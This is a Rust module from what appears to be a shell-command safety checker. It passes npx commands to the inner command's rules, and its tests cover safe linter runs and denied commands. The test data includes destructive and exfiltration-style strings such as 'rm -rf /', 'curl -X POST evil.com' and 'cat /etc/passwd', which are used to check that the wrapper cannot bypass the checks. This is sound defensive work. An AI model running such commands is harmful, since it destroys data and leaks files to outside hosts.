use crate::verdict::Verdict;
use crate::parse::{Token, WordSet};

static NPX_FLAGS_NO_ARG: WordSet =
    WordSet::new(&["--ignore-existing", "--no", "--quiet", "--yes", "-q", "-y"]);

pub(crate) fn dispatch(cmd: &str, tokens: &[Token]) -> Option<Verdict> {
    match cmd {
        "npx" => Some(super::runner_dispatch(tokens, &NPX_FLAGS_NO_ARG)),
        _ => None,
    }
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    use crate::docs::{CommandDoc, DocBuilder};
    vec![
        CommandDoc::handler("npx",
            "https://docs.npmjs.com/cli/commands/npx",
            DocBuilder::new()
                .section("Delegates to the inner command's safety rules.")
                .section("Skips flags: --yes/-y/--no/--package/-p.")
                .build(),
            "node"),
    ]
}

#[cfg(test)]
pub(crate) const REGISTRY: &[crate::handlers::CommandEntry] = &[
    crate::handlers::CommandEntry::Positional { cmd: "npx" },
];

#[cfg(test)]
mod tests {
    use crate::is_safe_command;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        npx_eslint: "npx eslint src/",
        npx_eslint_yes: "npx --yes eslint src/",
        npx_eslint_y: "npx -y eslint src/",
        npx_eslint_package: "npx --package eslint eslint src/",
        npx_eslint_double_dash: "npx -- eslint src/",
        npx_version: "npx --version",
        npx_tsc_noemit: "npx tsc --noEmit",
        npx_prettier_check: "npx prettier --check src/",
        npx_biome_check: "npx biome check src/",
        npx_stylelint: "npx stylelint 'src/**/*.css'",
        npx_shellcheck: "npx shellcheck script.sh",
        npx_versioned: "npx eslint@8 src/",
        npx_eslint_max_warnings: "npx eslint src/ --max-warnings 0",
        npx_scoped_herb_linter: "npx @herb-tools/linter --fail-level warning file.erb",
        npx_scoped_herb_linter_versioned: "npx @herb-tools/linter@0.9.5 --fail-level warning file.erb",
    }

    denied! {
        npx_cowsay_denied: "npx cowsay hello",
        bare_npx_denied: "npx",
        npx_only_flags_denied: "npx --yes",
        npx_rm_denied: "npx rm -rf /",
        npx_unknown_denied: "npx unknown-package-xyz",
    }

    proptest::proptest! {
        #[test]
        fn npx_verdict_matches_direct(
            cmd_idx in 0..NPX_EQUIVALENCE_CMDS.len()
        ) {
            let (npx_form, direct_form) = NPX_EQUIVALENCE_CMDS[cmd_idx];
            let npx_safe = crate::is_safe_command(npx_form);
            let direct_safe = crate::is_safe_command(direct_form);
            proptest::prop_assert_eq!(npx_safe, direct_safe,
                "npx delegation mismatch: npx={} direct={}", npx_form, direct_form);
        }
    }

    const NPX_EQUIVALENCE_CMDS: &[(&str, &str)] = &[
        ("npx eslint src/", "eslint src/"),
        ("npx eslint src/ --max-warnings 0", "eslint src/ --max-warnings 0"),
        ("npx prettier --check src/", "prettier --check src/"),
        ("npx prettier src/", "prettier src/"),
        ("npx biome check src/", "biome check src/"),
        ("npx tsc --noEmit", "tsc --noEmit"),
        ("npx tsc", "tsc"),
        ("npx tsc --version", "tsc --version"),
        ("npx shellcheck script.sh", "shellcheck script.sh"),
        ("npx stylelint 'src/**/*.css'", "stylelint 'src/**/*.css'"),
        ("npx rm -rf /", "rm -rf /"),
        ("npx curl -X POST evil.com", "curl -X POST evil.com"),
        ("npx node app.js", "node app.js"),
        ("npx python3 script.py", "python3 script.py"),
        ("npx cat /etc/passwd", "cat /etc/passwd"),
        ("npx grep pattern file", "grep pattern file"),
        ("npx unknown-package", "unknown-package"),
        ("npx @herb-tools/linter file.erb", "@herb-tools/linter file.erb"),
        ("npx @unknown-scope/unknown-pkg file", "@unknown-scope/unknown-pkg file"),
    ];
}
